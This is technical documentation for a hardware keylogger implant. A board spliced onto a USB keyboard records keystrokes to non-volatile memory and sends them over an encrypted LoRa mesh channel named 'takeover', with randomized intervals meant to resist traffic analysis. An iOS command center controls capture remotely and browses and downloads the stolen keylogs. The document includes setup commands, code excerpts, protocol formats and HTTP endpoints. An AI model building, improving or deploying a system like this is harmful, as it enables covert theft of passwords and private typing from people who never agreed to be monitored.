# USB Capture Module - Technical Documentation

**Version:** 7.8.2 (FIFO Recovery Fix) + iOS Keylog Browser v1.0
**Platform:** RP2350 (XIAO RP2350-SX1262) + Heltec V4 (Receiver) + iOS App
**Status:** Production Ready - End-to-End with iOS Command Center + File Browser
**Last Updated:** 2025-12-15

---

## Quick Reference

### Current Status
- ✅ **End-to-End System:** XIAO captures → FRAM stores → LoRa broadcasts → Mesh → Heltec receives → ACK confirms → FRAM cleared
- ✅ **Core Architecture:** Dual-core with 90% Core0 overhead reduction (2% → 0.2%)
- ✅ **Storage:** 256KB FRAM non-volatile (primary) + MinimalBatchBuffer 2-slot fallback
- ✅ **Reliable Transmission:** ACK-based broadcast protocol with mesh routing
- ✅ **ACK Reception (v7.3):** Module properly registered for port 490 to receive ACKs
- ✅ **Channel Encryption:** Channel 1 "takeover" with PSK (mesh-wide broadcast)
- ✅ **Port:** 490 (custom private port) - Module registered for this port
- ✅ **TX Interval:** Randomized 40s-4min for traffic analysis resistance (v7.6)
- ✅ **Receiver Module:** KeylogReceiverModule on Heltec V4 with flash storage
- ✅ **iOS Command Center (v7.8):** Native SwiftUI app for remote control and monitoring
- ✅ **Command Response Fix (v7.8.1):** KeylogReceiver passes text responses to iOS
- ✅ **FIFO Recovery Fix (v7.8.2):** Core1 responds to SDK lockout during pause
- ✅ **iOS Keylog Browser (v1.0):** Native file browser with preview and download
- ✅ **Deduplication (v7.1):** Flash-persistent per-node batch tracking (16 nodes × 16 batches)
- ✅ **Time Sync:** Real unix epoch from mesh-synced GPS nodes (RTCQualityFromNet)
- ✅ **Build:** Flash 58.5%, RAM 24.4% - Production ready
- ⚠️ **Commands:** Sent from iOS app via Heltec mesh gateway on port 490

### Key Features
- **PIO-Based Capture:** Hardware-accelerated USB signal processing
- **Dual-Core Architecture:** Core1 = complete processing, Core0 = transmission only
- **FRAM Storage (v5.0):** 256KB non-volatile, 10^13 endurance, survives power loss
- **ACK-Based Delivery (v6.0→v7.0):** Reliable broadcast transmission with mesh routing
- **KeylogReceiverModule (v6.0):** Heltec V4 base station with flash storage
- **iOS Command Center (v7.8):** Native SwiftUI app with 14 remote commands
- **Command Response Fix (v7.8.1):** Text response detection and pass-through to iOS
- **Mesh Broadcast (v7.0):** Channel 1 PSK encryption, any node can receive
- **MinimalBatchBuffer (v7.0):** NASA-compliant 2-slot RAM fallback (replaced 8-slot PSRAM)
- **Deduplication (v7.1):** Flash-persistent per-node batch tracking with LRU eviction
- **Randomized Interval (v7.6):** 40s-4min random for traffic analysis resistance
- **Port 490 (v7.0):** Custom private port in 256-511 range
- **8 Command Center Commands (v7.8):** FRAM management, transmission control, diagnostics
- **Simulation Mode (v6.0):** Test without USB keyboard using build flag
- **Lock-Free Communication:** Memory barriers for ARM Cortex-M33 cache coherency
- **RTC Integration:** Three-tier fallback (RTC → BUILD_EPOCH → uptime)
- **Delta-Encoded Timestamps:** 70% space savings on Enter keys
- **Comprehensive Statistics:** Tracks failures (TX, overflow, storage, retries, duplicates)

### Hardware Requirements
- **GPIO Pins:** 16/17/18 (D+, D-, START) - **MUST be consecutive**
- **USB Speed:** Low Speed (1.5 Mbps) default, Full Speed (12 Mbps) optional
- **Memory:** ~5KB RAM overhead, 4KB RAM buffer fallback
- **FRAM:** Fujitsu MB85RS2MTA (256KB) on SPI0 CS=GPIO1 (optional but recommended)

---

## Table of Contents

1. [End-to-End System](#end-to-end-system)
2. [Architecture](#architecture)
3. [ACK-Based Transmission Protocol](#ack-based-transmission-protocol)
4. [KeylogReceiverModule](#keylogreceivermodule)
5. [iOS Command Center](#ios-command-center)
6. [FRAM Storage](#fram-storage)
7. [Hardware Configuration](#hardware-configuration)
8. [Software Components](#software-components)
9. [Data Flow](#data-flow)
10. [API Reference](#api-reference)
11. [Configuration](#configuration)
12. [Performance & Metrics](#performance--metrics)
13. [Troubleshooting](#troubleshooting)
14. [Data Structures](#data-structures)
15. [Version History](#version-history)

---

## End-to-End System

### System Overview (v7.0)

The USB Capture system uses mesh broadcast with channel-based encryption:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         USB CAPTURE SYSTEM v7.0                             │
├─────────────────────────────────────┬───────────────────────────────────────┤
│      XIAO RP2350-SX1262 (Sender)    │      Heltec V4 (Receiver)             │
│                                     │                                       │
│  ┌─────────────────────────────┐    │    ┌─────────────────────────────┐    │
│  │ USB Keyboard → PIO Capture  │    │    │ KeylogReceiverModule        │    │
│  │      ↓                      │    │    │  - Receives broadcast       │    │
│  │ HID Decode → Delta Encode   │    │    │  - Extracts batch_id        │    │
│  │      ↓                      │    │    │  - Stores to flash          │    │
│  │ FRAM Storage (256KB)        │    │    │  - Sends ACK broadcast      │    │
│  │      ↓                      │    │    └──────────────┬──────────────┘    │
│  │ USBCaptureModule            │    │                   │                   │
│  │  - Read batch from FRAM     │─Broadcast (ch1)───────>│                   │
│  │  - Generate batch_id        │   Port 490             │                   │
│  │  - Broadcast to mesh        │<─ACK Broadcast─────────┤                   │
│  │  - Wait for ACK (5 min)     │    │    ┌──────────────┴──────────────┐    │
│  │  - Delete on ACK or retry   │    │    │ Flash Storage               │    │
│  └─────────────────────────────┘    │    │ /keylogs/<node_id>/         │    │
│                                     │    │   batch_<timestamp>.txt     │    │
└─────────────────────────────────────┴────└─────────────────────────────┘────┘
```

### v7.0 Key Changes from v6.0

| Aspect | v6.0 | v7.0 |
|--------|------|------|
| **Port** | 256 (PRIVATE_APP) | 490 (custom private) |
| **Channel** | 0 (primary) + PKI | 1 "takeover" + PSK |
| **Transmission** | Direct to targetNode | Broadcast to mesh |
| **TX Interval** | 6 seconds | Random 40s-4min (v7.6) |
| **RAM Fallback** | PSRAM 8-slot (4KB) | MinimalBatchBuffer 2-slot (1KB) |
| **Encryption** | PKI (X25519) | Channel PSK |

### Communication Flow

1. **Capture:** XIAO captures keystrokes via PIO hardware
2. **Storage:** Batches stored in FRAM (non-volatile, survives power loss)
3. **Transmission:** USBCaptureModule sends batch as PKI-encrypted direct message
4. **Reception:** KeylogReceiverModule receives and validates
5. **Storage:** Receiver stores to flash filesystem
6. **ACK:** Receiver sends acknowledgment back to sender
7. **Cleanup:** Sender deletes batch from FRAM on ACK receipt

### Channel PSK Encryption (v7.0)

All keylog transmissions use channel-based PSK encryption:

- **Channel:** Index 1 with name "takeover"
- **Encryption:** AES256 with shared PSK (Pre-Shared Key)
- **Privacy:** All nodes with matching channel PSK can decrypt
- **Advantage:** No PKI key exchange needed, works immediately

**Channel Configuration:**
```bash
# On XIAO RP2350 (sender):
meshtastic --ch-set name "takeover" --ch-index 1
meshtastic --ch-set psk random --ch-index 1
meshtastic --ch-index 1 --info  # Note the PSK

# On Heltec V4 (receiver):
meshtastic --ch-set name "takeover" --ch-index 1
meshtastic --ch-set psk base64:<SAME-PSK-FROM-XIAO> --ch-index 1
```

**Verification:**
```bash
# Both devices should show same channel config:
meshtastic --ch-index 1 --info
# Verify: name="takeover", PSK matches
```

### Simulation Mode

For testing without a physical USB keyboard:

```bash
# Build with simulation enabled
pio run -e xiao-rp2350-sx1262 -D USB_CAPTURE_SIMULATE_KEYS
```

Simulation generates fake keystrokes every 5 seconds, allowing testing of:
- FRAM write/read operations
- LoRa transmission
- ACK reception
- End-to-end data flow

---

## Architecture

### High-Level Design

```
┌─────────────────────────────────────────────────────────────┐
│                    RP2350 DUAL-CORE                          │
├──────────────────────────────┬──────────────────────────────┤
│         CORE 0               │         CORE 1               │
│    (Meshtastic)              │    (USB Capture)             │
│                              │                              │
│  ┌────────────────────┐      │  ┌────────────────────┐      │
│  │ USBCaptureModule   │      │  │ usb_capture_main   │      │
│  │  - Poll PSRAM      │      │  │  - PIO polling     │      │
│  │  - Decode text     │      │  │  - Packet assembly │      │
│  │  - Transmit LoRa   │      │  │  - HID decoding    │      │
│  └────────┬───────────┘      │  │  - Buffer mgmt     │      │
│           │                  │  └──────┬─────────────┘      │
│           ↓                  │         ↓                    │
│  ┌────────────────────┐      │  ┌────────────────────┐      │
│  │  PSRAM Buffer      │◄─────┼──┤  PSRAM Buffer      │      │
│  │  (Consumer)        │      │  │  (Producer)        │      │
│  └────────────────────┘      │  └────────────────────┘      │
└──────────────────────────────┴──────────────────────────────┘
                                          │
                                          ↓
                              ┌────────────────────┐
                              │  USB Keyboard      │
                              │  (GPIO 16/17)      │
                              └────────────────────┘
```

### Architecture Evolution v3.0 → v5.0

**v3.0 Change:** Core1 now handles ALL keystroke processing, Core0 is pure transmission layer.

```
BEFORE (v2.1):                    AFTER (v3.0):
Core1: Capture → Decode → Queue   Core1: Capture → Decode → Format → Buffer → PSRAM
Core0: Queue → Format → Buffer    Core0: PSRAM → Decode Text → Transmit

Core0 Overhead: ~2%               Core0 Overhead: ~0.2% (90% reduction!)
```

**v5.0 Change:** Non-volatile FRAM storage replaces volatile RAM buffer.

```
BEFORE (v4.0):                    AFTER (v5.0):
Core1: ... → Buffer → RAM(4KB)    Core1: ... → Buffer → FRAM(256KB)
Core0: RAM → Transmit → Done      Core0: FRAM → Transmit → Delete

Storage: Volatile, 8 slots        Storage: Non-volatile, 500+ batches
Power Loss: Data lost             Power Loss: Data preserved
```

**v6.0 Change:** ACK-based reliable transmission with Heltec V4 receiver.

```
BEFORE (v5.0):                    AFTER (v6.0):
XIAO: Broadcast → Mesh            XIAO: PKI DM → Heltec V4
No confirmation                   Wait for ACK → Retry on failure
Delete after send                 Delete only on ACK receipt
Lossy delivery                    Reliable delivery

Sender only                       Sender + Receiver (KeylogReceiverModule)
No encryption                     PKI encryption (X25519 + ChaCha20)
```

### RTC Integration (v4.0)

**Three-Tier Time Fallback System:**

```
Priority 1: Meshtastic RTC (Quality >= FromNet)
    ↓ GPS-synced mesh time, NTP from phone, or GPS module
Priority 2: BUILD_EPOCH + uptime
    ↓ Firmware compile timestamp + device runtime
Priority 3: Uptime only
    ↓ Seconds since boot (v3.5 fallback)
```

**Time Source Quality Levels:**

| Quality | Name | Source | Accuracy | Example |
|---------|------|--------|----------|---------|
| 4 | GPS | GPS satellite lock | ±1 second | Onboard GPS module |
| 3 | NTP | Phone app time sync | ±1 second | Connected to Meshtastic app |
| 2 | **Net** | **Mesh node with GPS** | **±2 seconds** | **Heltec V4 sync** |
| 1 | Device | Onboard RTC chip | Variable | RTC battery-backed chip |
| 0 | None | BUILD_EPOCH + uptime | ±build time | Standalone device |

**Implementation:** `core1_get_current_epoch()` function in `keyboard_decoder_core1.cpp`

---

## ACK-Based Transmission Protocol

### Overview (v7.0)

The ACK-based protocol ensures reliable delivery of keystroke batches via mesh broadcast.

### Protocol Details

**Message Format:**
```
Sender → Mesh Broadcast (port 490, channel 1):
┌──────────────┬─────────────────────────────┐
│ batch_id (4B)│ decoded_text (variable)     │
└──────────────┴─────────────────────────────┘

Receiver → Mesh Broadcast (ACK response, port 490, channel 1):
┌─────────────────────────────┐
│ "ACK:0x" + 8 hex digits     │  (e.g., "ACK:0x12345678")
└─────────────────────────────┘
```

**v7.0 Broadcast Model:**
- Sender broadcasts to `NODENUM_BROADCAST` on channel 1
- Any node with matching PSK can receive
- First ACK received triggers batch deletion
- Multi-hop mesh routing enabled automatically

**Batch ID Generation:**
- 32-bit unique identifier per batch
- Generated from: `(millis() << 16) | (batch_count & 0xFFFF)`
- Ensures uniqueness across sessions

### State Machine

```
┌──────────────────┐
│  IDLE            │
│  (no pending)    │
└────────┬─────────┘
         │ FRAM has batch
         ▼
┌──────────────────┐
│  SENDING         │───────────────────────┐
│  (broadcast)     │                       │
└────────┬─────────┘                       │
         │ sent ok                         │ send failed
         ▼                                 │
┌──────────────────┐                       │
│  WAITING_ACK     │◄──────────────────────┘
│  (timeout 30s)   │
└────────┬─────────┘
         │                    │
    ACK received         timeout (no ACK)
         │                    │
         ▼                    ▼
┌──────────────────┐  ┌──────────────────┐
│  DELETE_BATCH    │  │  RETRY           │
│  (FRAM cleanup)  │  │  (backoff wait)  │
└────────┬─────────┘  └────────┬─────────┘
         │                     │
         └──────────┬──────────┘
                    ▼
            Back to IDLE
```

### Retry Strategy

**Exponential Backoff:**
```
Attempt 1: Wait 30 seconds
Attempt 2: Wait 60 seconds
Attempt 3: Wait 120 seconds
After 3 failures: Reset and retry next cycle (20 seconds)
```

**Key Behaviors:**
- Batches are NEVER deleted on transmission failure
- FRAM persists batches across power cycles
- Eventually consistent delivery (may take multiple sessions)
- No data loss even with prolonged network outages

### Configuration

```cpp
// In USBCaptureModule.cpp:
static constexpr uint32_t ACK_TIMEOUT_MS = 30000;      // 30 second ACK timeout
static constexpr uint32_t RETRY_INTERVAL_MS = 20000;   // 20 second retry cycle
static constexpr uint8_t MAX_RETRY_ATTEMPTS = 3;       // Max retries before reset
```

---

## KeylogReceiverModule

### Overview (v7.1)

KeylogReceiverModule runs on a Heltec V4 (or any ESP32 Meshtastic device) to receive, store, and acknowledge keystroke batches. Version 7.1 adds flash-persistent deduplication to prevent storing duplicate batches when ACKs are lost in the mesh.

### Features

- **Mesh Broadcast Reception:** Receives channel 1 PSK-encrypted broadcasts on port 490
- **Batch Validation:** Extracts and validates batch_id from payload
- **Deduplication (v7.1):** Flash-persistent per-node batch tracking prevents duplicate storage
- **Flash Storage:** Persists batches to `/keylogs/<sender_node_id>/` directory
- **ACK Response:** Sends direct message ACK back to confirm receipt (even for duplicates)
- **Multi-Sender Support:** Organizes storage by sender node ID with LRU eviction (16 nodes max)

### File Storage Structure

```
/littlefs/
└── keylogs/
    ├── .dedup_cache                 (v7.1 - deduplication state, ~1.2KB)
    └── <sender_node_id>/           (e.g., "12345678")
        ├── batch_1702345678.txt    (timestamp-named files)
        ├── batch_1702345890.txt
        └── ...
```

### Deduplication System (v7.1)

Prevents duplicate storage when ACKs are lost and sender retransmits.

**Problem:**
```
Sender transmits batch 0x12345678 → Receiver stores → ACK lost in mesh
Sender retransmits batch 0x12345678 → Without dedup: DUPLICATE stored!
```

**Solution:** Per-node batch ID tracking with LRU eviction

```cpp
// Data structures in KeylogReceiverModule.h
#define DEDUP_MAX_NODES        16    // Max sender nodes tracked (LRU eviction)
#define DEDUP_BATCHES_PER_NODE 16    // Recent batches per node (circular buffer)
#define DEDUP_CACHE_FILE       "/keylogs/.dedup_cache"
#define DEDUP_CACHE_MAGIC      0xDEDC
#define DEDUP_SAVE_INTERVAL_MS 30000 // Debounce flash writes

struct DedupNodeEntry {           // 76 bytes per node
    NodeNum nodeId;               // 0 = empty slot
    uint32_t lastAccessTime;      // For LRU eviction
    uint32_t recentBatchIds[16];  // Circular buffer
    uint8_t nextIdx, count;       // Buffer management
};

// Total cache: 8 + (16 × 76) = 1,224 bytes
```

**Flow:**
```
handleReceived()
    │
    ▼
isDuplicateBatch(nodeId, batchId)
    │
    ├─ [DUPLICATE] → Skip store → sendAck() → return
    │
    └─ [NEW] → storeKeystrokeBatch() → recordReceivedBatch()
                                            │
                                            ▼
                                     saveDedupCacheIfNeeded() (30s debounce)
                                            │
                                            ▼
                                     sendAck()
```

**Key Behaviors:**
| Scenario | Behavior |
|----------|----------|
| New batch | Store → Record in cache → ACK |
| Duplicate batch | Skip store → ACK (so sender clears FRAM) |
| Cache full | LRU eviction (oldest accessed node removed) |
| Device reboot | Cache loaded from `/keylogs/.dedup_cache` |
| Flash write | Debounced to every 30 seconds |

**NASA Power of 10 Compliance:**
- Fixed loop bounds (16 nodes × 16 batches)
- No dynamic allocation (static cache array)
- All return values checked
- Assertions verify assumptions

### Module Configuration

```cpp
// In KeylogReceiverModule.h:
#define KEYLOG_STORAGE_DIR "/keylogs"
#define MAX_KEYLOG_FILES_PER_NODE 100  // Auto-cleanup oldest when exceeded
```

### Build Configuration

The receiver module is enabled on Heltec V4 builds:

```ini
# platformio.ini (heltec-v4 environment)
build_flags =
    -D KEYLOG_RECEIVER_ENABLED=1
```

### API Reference

#### KeylogReceiverModule::handleReceivedKeylog()
```cpp
void handleReceivedKeylog(const meshtastic_MeshPacket &mp);
```
Processes incoming keylog packets, extracts batch_id, stores to flash, sends ACK.

#### KeylogReceiverModule::sendAck()
```cpp
bool sendAck(NodeNum dest, uint32_t batch_id);
```
Sends ACK response back to sender. Returns `true` on success.

#### KeylogReceiverModule::storeKeylog()
```cpp
bool storeKeylog(NodeNum sender, uint32_t batch_id, const char *text, size_t len);
```
Writes keylog batch to flash storage. Returns `true` on success.

### Viewing Stored Keylogs

**Via Meshtastic CLI:**
```bash
# Connect to Heltec V4 via USB
meshtastic --port /dev/ttyUSB0 --export-config

# Use ESP32 filesystem tools or custom commands to access /keylogs/
```

---

## iOS Command Center

### Overview (v7.8 + v7.8.1)

The iOS Command Center provides native SwiftUI interface for remote monitoring and control of XIAO RP2350 USB Capture devices. The system consists of:

1. **iOS App Integration:** CommandCenterView integrated into Meshtastic-Apple app
2. **Mesh Communication:** Commands sent via Heltec V4 TCP gateway on Channel 1, Port 490
3. **Command Response Fix (v7.8.1):** KeylogReceiverModule passes text responses to iOS

### Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                      iOS APP (Meshtastic)                      │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ CommandCenterView (SwiftUI)                              │ │
│  │  ├─ Device Selection (XIAO node picker)                 │ │
│  │  ├─ Response Panel (color-coded status badges)          │ │
│  │  ├─ Quick Actions (Status, Stats, Start/Stop/Send)      │ │
│  │  └─ Advanced (FRAM Management, Diagnostics)             │ │
│  └──────────────────────────────────────────────────────────┘ │
│                            ↕ TCP                               │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ AccessoryManager+USBCapture                              │ │
│  │  ├─ sendUSBCaptureCommand(command:toNode:)              │ │
│  │  ├─ Creates MeshPacket (Ch=1, Port=490)                 │ │
│  │  └─ Notification: .usbCaptureResponseReceived           │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬───────────────────────────────┘
                                 │ TCP port 4403 (Protobuf)
                                 │ meshtastic.local
                                 ↓
┌────────────────────────────────────────────────────────────────┐
│                    HELTEC V4 (Gateway)                         │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ KeylogReceiverModule (v7.8.1)                            │ │
│  │  ├─ Receives port 490 broadcasts                        │ │
│  │  ├─ Detects command responses (text)                    │ │
│  │  ├─ Returns ProcessMessage::CONTINUE                     │ │
│  │  └─ Forwards to iOS via TCP                             │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬───────────────────────────────┘
                                 │ LoRa Mesh Broadcast
                                 │ Channel 1 "takeover" PSK
                                 ↓
┌────────────────────────────────────────────────────────────────┐
│                  XIAO RP2350 (Capture Device)                  │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ USBCaptureModule                                         │ │
│  │  ├─ Receives command on port 490                        │ │
│  │  ├─ executeCommand() generates text response            │ │
│  │  ├─ Broadcasts response on Channel 1                    │ │
│  │  └─ iOS receives via Heltec gateway                     │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────┘
```

### Command Flow

**1. iOS → XIAO:**
```swift
// iOS sends command
try await accessoryManager.sendUSBCaptureCommand(
    command: .status,
    toNode: xiaoNodeNum  // 0xc20a87dd
)

// Creates MeshPacket:
// - channel: 1 (Channel 1 "takeover")
// - to: xiaoNodeNum
// - portnum: 490
// - payload: "STATUS" (UTF-8 text)
// - wantResponse: true
```

**2. Mesh Transmission:**
- iOS → TCP → Heltec V4
- Heltec → LoRa broadcast on Channel 1
- XIAO receives on port 490

**3. XIAO Response:**
- XIAO executes command
- Generates text response (e.g., "USB Capture: STATUS [details]")
- Broadcasts response on Channel 1, port 490

**4. Heltec Gateway (v7.8.1 fix):**
```cpp
// KeylogReceiverModule::handleReceived()
// Detects text response (not binary batch):
if (mightBeText && !hasProtocolMagic) {
    LOG_INFO("[KeylogReceiver] Command response detected, passing through to iOS");
    return ProcessMessage::CONTINUE;  // ← Forwards to iOS!
}
```

**5. iOS Receives:**
```swift
// AccessoryManager.swift handles port 490:
if data.portnum.rawValue == 490 {
    if let responseText = String(data: data.payload, encoding: .utf8) {
        Foundation.NotificationCenter.default.post(
            name: .usbCaptureResponseReceived,
            object: responseText
        )
    }
}

// CommandCenterView updates UI:
.onReceive(NotificationCenter.default.publisher(for: .usbCaptureResponseReceived)) { notification in
    if let response = notification.object as? String {
        updateResponse(response)  // Green ✅ badge, display text
    }
}
```

### iOS App Integration

**File Locations (Meshtastic-Apple repo):**
```
Meshtastic/
├── Accessory/Accessory Manager/
│   ├── AccessoryManager+USBCapture.swift    # 14 command functions
│   └── AccessoryManager.swift               # Port 490 handler (lines 567-612)
├── Views/
│   ├── CommandCenter/
│   │   └── CommandCenterView.swift          # Main UI (710 lines)
│   └── Settings/
│       └── Settings.swift                   # Navigation link (lines 351-357)
└── Extensions/
    └── Notifications+USBCapture.swift       # .usbCaptureResponseReceived
```

**Key Components:**

1. **AccessoryManager+USBCapture.swift** (217 lines)
   - `sendUSBCaptureCommand(command:parameters:toNode:authToken:)` - Main send function
   - 14 convenience functions (sendStatus, sendStart, sendStop, etc.)
   - Response parser: `parseUSBCaptureResponse(from:)`
   - Port: 490 (USB_CAPTURE_PORTNUM)

2. **CommandCenterView.swift** (710 lines)
   - 4 sections: Response Panel, Device, Quick Actions, Advanced
   - Color-coded response badges (✅/❌/⏳)
   - Loading overlay with spinner
   - 10-second timeout detection
   - JSON auto-formatting

3. **Port 490 Handler** (AccessoryManager.swift)
   - Handles both `.privateApp` and `.UNRECOGNIZED` cases
   - Posts notification for CommandCenterView
   - Logs responses for debugging

### Available Commands

**Query Commands:**
- **STATUS** - Module status (capture state, transmission stats)
- **STATS** - Detailed statistics (TX success/fail/retry, FRAM usage)
- **DUMP** - MinimalBatchBuffer state (2-slot RAM fallback)

**Control Commands:**
- **START** - Enable keystroke capture
- **STOP** - Disable keystroke capture
- **TEST <text>** - Inject test text into capture buffer

**FRAM Management (v7.8):**
- **FRAM_CLEAR** - Erase all FRAM storage
- **FRAM_STATS** - Detailed FRAM statistics (batches, usage %, evictions)
- **FRAM_COMPACT** - Trigger compaction/eviction

**Transmission Control (v7.8):**
- **SET_INTERVAL <seconds>** - Set TX interval (placeholder - randomized in v7.6)
- **SET_TARGET <node_id>** - Set target node ID
- **FORCE_TX** - Force immediate transmission

**Diagnostics (v7.8):**
- **RESTART_CORE1** - Not supported (returns error - RP2350 limitation)
- **CORE1_HEALTH** - Core1 health metrics (status, USB, capture count)

### UI Features

**Response Panel (Always at Top):**
```
┌──────────────────────────────────────────────┐
│ ✅ Success                    just now       │
│ USB Capture: STATUS                          │
│ Capture: ON | Batches: 5 | FRAM: 2% used    │
└──────────────────────────────────────────────┘
```

- Color-coded badges: Green (success), Red (error), Orange (pending), Blue (info)
- Animated flash on response arrival (2-second highlight)
- JSON auto-formatting
- Selectable text for copying

**Device Selection:**
- Node picker with 0x format (e.g., 0xc20a87dd)
- Auth token configuration (optional)
- Status indicator: ✅ Ready / ⚠️ Select node

**Quick Actions:**
- Device Status (blue button)
- Statistics (blue button)
- Start / Stop / Send (green/red/blue HStack)

**Advanced (Collapsible):**
- DisclosureGroup: FRAM Management
  - FRAM Statistics
  - Clear FRAM (destructive red)
- DisclosureGroup: Diagnostics
  - Core1 Health
  - Inject Test Text

### Command Response Fix (v7.8.1)

**Problem:** KeylogReceiverModule was intercepting command responses and returning `ProcessMessage::STOP`, preventing them from reaching iOS.

**Solution:** Added text detection in KeylogReceiverModule.cpp:

```cpp
// Check if this is a command response (plain text, not binary batch)
bool mightBeText = true;
for (size_t i = 0; i < payloadLen && i < 32; i++) {
    uint8_t c = payload[i];
    // Allow printable ASCII and whitespace
    if (!((c >= 0x20 && c <= 0x7E) || c == '\t' || c == '\n' || c == '\r')) {
        mightBeText = false;
        break;
    }
}

// If payload looks like text and doesn't have binary batch header
bool hasProtocolMagic = (payloadLen >= 2 &&
                         payload[0] == KEYLOG_PROTOCOL_MAGIC_0 &&
                         payload[1] == KEYLOG_PROTOCOL_MAGIC_1);

if (mightBeText && !hasProtocolMagic) {
    LOG_INFO("[KeylogReceiver] Command response detected, passing through to iOS");
    return ProcessMessage::CONTINUE;  // ← Forwards to iOS
}
```

**Result:**
- ✅ Keystroke batches (binary with magic marker 0x55 0x4B) → Processed and stored
- ✅ Command responses (plain text) → Passed through to iOS
- ✅ ACKs (starts with "ACK:") → Passed through (unchanged)

---

## iOS Keylog Browser (v1.0)

### Overview

Native SwiftUI file browser for viewing and managing keylog files stored on Heltec V4 receiver. Uses direct HTTP communication (WiFi-only, no mesh).

**Key Features:**
- Browse files organized by sender node
- Preview content (first 5 KB) before download
- Download via iOS Share Sheet
- Delete files with confirmation
- Storage statistics with usage alerts
- WiFi connectivity check

### Architecture

**Communication:** iOS → HTTP (WiFi) → Heltec V4 Web Server → `/keylogs/` filesystem

**HTTP Endpoints:**
- `GET /json/keylogs/browse` - List all files by node
- `GET /json/keylogs/download/{nodeId}/{filename}` - Download file
- `DELETE /json/keylogs/delete/{nodeId}/{filename}` - Delete file
- `DELETE /json/keylogs/erase-all` - Clear all storage

**Files Created:**
1. `Meshtastic/Helpers/KeylogAPI.swift` - HTTP client (~150 lines)
2. `Meshtastic/Views/CommandCenter/KeylogBrowserView.swift` - File list (~300 lines)
3. `Meshtastic/Views/CommandCenter/KeylogFileDetailView.swift` - Preview + download (~200 lines)
4. `Meshtastic/Views/Settings/Settings.swift` - Navigation link (8 lines added)

**User Flow:**
```
Settings → Keylog Files
  ↓ Check WiFi
  ↓ Fetch files
Display: Storage stats + Files by node
  ↓ Tap file
Preview: Metadata + 5 KB content + Actions
  ↓ Download
Share Sheet: Save/AirDrop/Share
```

**Features:**
- Node name lookup from CoreData
- Color-coded storage progress (red >90%, orange >75%)
- Swipe-to-delete
- Pull-to-refresh
- Empty states and loading states
- WiFi requirement with auto-retry
- Monospaced preview with text selection
- Confirmation dialogs for destructive actions

### Testing Checklist (iOS Keylog Browser)

**Basic Navigation:**
- [ ] Open Settings → Keylog Files
- [ ] View displays when WiFi connected
- [ ] WiFi required message when offline
- [ ] Navigation back to Settings works

**File Browsing:**
- [ ] Files grouped by node correctly
- [ ] Node names resolve from CoreData
- [ ] Storage stats display accurately
- [ ] Progress bar color-coded by usage
- [ ] Empty state shows when no files

**File Operations:**
- [ ] Tap file opens detail view
- [ ] Preview loads first 5 KB
- [ ] Truncation indicator for large files
- [ ] Download via Share Sheet works
- [ ] Save to Files app succeeds
- [ ] AirDrop to Mac works
- [ ] Swipe-to-delete removes file
- [ ] Delete from detail view works
- [ ] Delete all clears all files
- [ ] Confirmations required for deletes

**Error Handling:**
- [ ] Network timeout shows error
- [ ] Invalid response handled gracefully
- [ ] Error alerts display correctly
- [ ] Retry after error works

### Testing Checklist

**Simulator Testing:**
- [ ] App builds without errors
- [ ] Command Center navigable
- [ ] All UI sections visible
- [ ] Buttons respond to taps
- [ ] Sheets open/close correctly
- [ ] Node configuration persists

**Hardware Testing (Commands):**
- [ ] STATUS → Shows module status
- [ ] STATS → Shows transmission stats
- [ ] FRAM_STATS → Shows storage usage
- [ ] START → Enables capture
- [ ] STOP → Disables capture
- [ ] FORCE_TX → Triggers send
- [ ] CORE1_HEALTH → Shows Core1 status
- [ ] TEST → Injects text

**End-to-End Validation:**
- [ ] Command round-trip < 1 second
- [ ] Responses display correctly with color-coded badges
- [ ] Auth token works (if configured)
- [ ] Error handling works
- [ ] Multiple commands in sequence

### Integration Steps

**Prerequisites:**
1. Heltec V4 with firmware v7.8.1 (command response fix)
2. XIAO RP2350 with firmware v7.8.1
3. Both devices on Channel 1 "takeover" with matching PSK
4. Meshtastic-Apple app built from source

**iOS App Setup:**
1. Open `Meshtastic.xcworkspace`
2. Verify 3 Swift files added to appropriate folders:
   - `AccessoryManager+USBCapture.swift`
   - `CommandCenterView.swift`
   - `Notifications+USBCapture.swift`
3. Build and run on device or simulator

**Device Configuration:**
1. Flash Heltec V4 with v7.8.1 firmware
2. Flash XIAO RP2350 with v7.8.1 firmware
3. Connect iOS to Heltec via WiFi (meshtastic.local)
4. Navigate to Settings → Command Center
5. Select XIAO node from picker
6. Test "Device Status" command

### Troubleshooting

**Issue: No response received**
- Check: Heltec V4 connected to iOS (green indicator)
- Check: XIAO node selected in Device section
- Check: Both devices on same Channel 1 PSK
- Check: Heltec firmware v7.8.1 (command response fix)

**Issue: Response shows "ACK:0x..." format**
- This is a keystroke batch ACK, not a command response
- Wait for actual STATUS response (should be plain text)
- Verify command was sent on port 490, not as text message

**Issue: "Invalid channel index 186" error**
- This is cosmetic - iOS receiving its own ACK broadcast
- Channel hash 0xBA (186 decimal) is correct for Channel 1
- Actual response already processed correctly
- Can be ignored

---

## FRAM Storage

### Overview (v5.0)

FRAM (Ferroelectric RAM) provides non-volatile storage that survives power loss, with virtually unlimited write endurance. This replaces the volatile RAM buffer for keystroke batch storage.

### Hardware Specifications

| Specification | Value |
|---------------|-------|
| **Chip** | Fujitsu MB85RS2MTA |
| **Form Factor** | Adafruit SPI Non-Volatile FRAM Breakout |
| **Capacity** | 2Mbit / 256KB |
| **Interface** | SPI @ 20MHz (supports up to 40MHz) |
| **Endurance** | 10^13 read/write cycles |
| **Data Retention** | 200+ years at 25°C |
| **Operating Voltage** | 3.0V - 3.6V |
| **Device ID** | Mfr=0x04, Prod=0x4803 |

### SPI Bus Sharing

FRAM shares SPI0 bus with the LoRa radio (SX1262):

```
SPI0 Bus Configuration:
├─ FRAM CS:  GPIO1 (D6)   - FRAMBatchStorage
├─ LoRa CS:  GPIO6 (D4)   - SX1262 radio
├─ SCK:      GPIO2 (D8)   - Shared clock
├─ MISO:     GPIO4 (D9)   - Shared data in
└─ MOSI:     GPIO3 (D10)  - Shared data out
```

